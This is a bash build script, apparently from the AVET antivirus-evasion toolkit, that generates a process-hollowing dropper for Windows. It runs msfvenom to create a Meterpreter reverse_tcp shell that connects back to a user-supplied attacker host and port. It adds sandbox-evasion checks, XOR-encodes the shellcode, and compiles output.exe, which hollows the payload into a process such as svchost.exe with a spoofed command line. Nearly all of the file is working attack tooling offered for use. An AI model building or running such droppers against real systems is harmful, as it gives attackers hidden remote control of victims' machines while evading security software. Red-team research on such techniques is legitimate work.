#!/bin/bash
# Hollowing 32-bit example build script
# First creates an AVET payload
# Secondly creates the executable that delivers the payload via hollowing
# The reverse_tcp meterpreter payload is hollowed into a target process by the generated dropper executable output.exe
# The target process to hollow into must be specified via the third(!) command line argument on dropper execution


# Usage example of generated output.exe:
#
# output.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
#
# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
# So you need to specify two values, separated by a comma delimiter.
#
# <process to hollow into>:
# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.
#
# <parent command line of new process>:
# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.
# So you can basically spoof the command line of your hollowing target here.
#
# !!!
# You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;)).


# print AVET logo
cat banner.txt

echo -e "\033[33;5mEnter LHOST\033[0m"
 echo -n "address: "
 read address

echo -e "\033[33;5mEnter LPORT\033[0m"
 echo -n "port: "
 read port

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$port
LHOST=$address

# import feature construction interface
. build/feature_construction.sh

# --- ---
# GENERATE HOLLOWING PAYLOAD input/hollowing_payload.exe
# --- ---

printf "\n+++ Generating hollowing payload +++\n"

# generate metasploit payload that will later be hollowed into the target process
# use reverse_tcp because the 32-bit test system appears to not handle https well
msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/sc_raw.txt

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'
reset_evasion_technique_counter

# generate key file
generate_key preset aabbcc12de input/key_raw.txt

# encode msfvenom shellcode
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# no command preexec
set_command_source no_data
set_command_exec no_command

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set decoder
set_decoder xor

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# enable debug print into file because we probably can not easily reach stdout of the hollowed process
enable_debug_print to_file C:/payload_log.txt

# compile hollowing payload
$win32_compiler -o input/hollowing_payload.exe source/avet.c -lws2_32
strip input/hollowing_payload.exe
printf "\n Generated hollowing payload input/hollowing_payload.exe\n"

# cleanup
cleanup_techniques


# --- ---
# GENERATE DROPPER EXECUTABLE THAT PERFORMS HOLLOWING output/output.exe
# --- ---

printf "\n+++ Generating dropper executable that performs hollowing +++\n"

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'

# generate key file
generate_key preset bbccdd34ef input/key_raw.txt

# encode hollowing payload
encode_payload xor input/hollowing_payload.exe input/hollowing_payload_enc.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/hollowing_payload_enc.txt input/hollowing_payload_enc_c.txt buf

# no command preexec
set_command_source no_data
set_command_exec no_command

# set payload source
set_payload_source static_from_file input/hollowing_payload_enc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
# this enables us to provide the path of the executable (and optionally the desired command line value) to hollow into at execution time via the third(!) command line argument
set_payload_info_source from_command_line_raw

# set decoder
set_decoder xor

# set payload execution technique
set_payload_execution_method hollowing32

# enable debug print to file because bytewise payload output to stdout makes things a mess
enable_debug_print to_file C:/dropper_log.txt

# compile hollowing payload
$win32_compiler -o output/output.exe source/avet.c -lws2_32
strip output/output.exe
printf "\n Generated dropper executable output/output.exe\n"

# cleanup
cleanup_techniques
